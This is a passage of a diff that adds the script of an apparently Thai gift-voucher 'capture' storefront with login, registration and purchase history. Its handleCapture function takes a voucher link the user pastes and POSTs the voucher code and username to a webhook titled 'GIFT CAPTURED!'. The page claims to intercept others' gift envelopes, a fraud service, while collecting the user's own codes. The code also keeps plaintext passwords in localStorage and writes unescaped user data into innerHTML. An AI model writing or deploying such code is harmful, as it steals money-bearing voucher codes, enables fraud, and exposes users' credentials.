+            alert("แจ้งโอนสำเร็จ! กรุณารอแอดมินอนุมัติครับ");
+            location.reload();
+        }
+
+        async function handleCapture() {
+            if(!currentUser) return openAuthModal();
+            const link = document.getElementById('giftLink').value.trim();
+            if(!link.includes("v=")) return alert("ลิงก์ไม่ถูกต้อง!");
+            const voucher = link.split('v=')[1];
+            await fetch(WEBHOOK_URL, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚨 GIFT CAPTURED!",
+                        color: 16753920,
+                        fields: [{name:"User", value:currentUser}, {name:"Voucher", value:voucher}]
+                    }]
+                })
+            });
+            alert("ระบบได้รับข้อมูลแล้ว กำลังดำเนินการดักซองครับ!");
+            location.reload();
+        }
+
+        function showPage(p) {
+            document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
+            document.getElementById(p + 'Page').classList.remove('hidden');
+            if(p === 'store') initStore();
+            if(p === 'history') {
+                const list = document.getElementById('inventoryList');
+                const history = usersDB[currentUser]?.history || [];
+                list.innerHTML = history.length ? history.map(h => `
+                    <div class="card-drip p-6 flex justify-between items-center mb-4">
+                        <div>
+                            <p class="text-[10px] text-zinc-600 font-bold uppercase mb-1">${h.date}</p>
+                            <h3 class="font-black text-sm uppercase italic">${h.name}</h3>
+                        </div>
+                        <code class="bg-black/80 px-4 py-2 rounded-xl text-blue-400 text-xs border border-zinc-800 tracking-widest">${h.key}</code>
+                    </div>`).join('') : '<p class="text-center py-20 text-zinc-800 font-black uppercase italic">No Products Owned</p>';
+            }
+            window.scrollTo(0,0);
+        }
+
+        function updateNavbar() {
+            if(!currentUser) return;
+            const user = usersDB[currentUser];
+            document.getElementById('navAuthArea').innerHTML = `
+                <div class="flex items-center gap-4 bg-zinc-900 border border-zinc-800 p-2 pr-6 rounded-2xl">
+                    <div class="w-10 h-10 ${user.isAdmin ? 'bg-red-600' : 'bg-blue-600'} rounded-xl flex items-center justify-center font-black">${currentUser[0].toUpperCase()}</div>
+                    <div class="text-left leading-tight">
+                        <p class="font-black text-xs uppercase">${currentUser} <span class="text-blue-500 ml-1">฿${user.isAdmin ? '∞' : user.balance}</span></p>
+                        <button onclick="localStorage.removeItem('activeUser'); location.reload();" class="text-[9px] text-zinc-600 hover:text-red-500 font-bold transition">Logout</button>
+                    </div>
+                </div>`;
+        }
+
+        function openAuthModal() { document.getElementById('authModal').classList.remove('hidden'); }
+        function closeAuthModal() { document.getElementById('authModal').classList.add('hidden'); }
+        function toggleAuth(m) {
+            document.getElementById('loginForm').classList.toggle('hidden', m === 'register');
+            document.getElementById('registerForm').classList.toggle('hidden', m === 'login');
+        }
+
+        function handleRegister(e) {
+            e.preventDefault();
+            const u = document.getElementById('regUser').value.trim().toLowerCase();
+            const p = document.getElementById('regPass').value;
+            if(usersDB[u]) return alert("มีชื่อนี้ในระบบแล้ว!");
+            usersDB[u] = { password: p, balance: 0, history: [], isAdmin: false };
+            localStorage.setItem('usersDB', JSON.stringify(usersDB));
+            alert("สมัครสมาชิกสำเร็จ!"); toggleAuth('login');
+        }
+
+        function handleLogin(e) {
+            e.preventDefault();
+            const u = document.getElementById('loginUser').value.trim().toLowerCase();
+            const p = document.getElementById('loginPass').value;
+            if(usersDB[u] && usersDB[u].password === p) {
+                localStorage.setItem('activeUser', u);
+                location.reload();
+            } else { alert("รหัสผ่านผิดพลาด!"); }
+        }
+
+        initStore();
+        if(currentUser) updateNavbar();
+    </script>
+</body>
+</html>
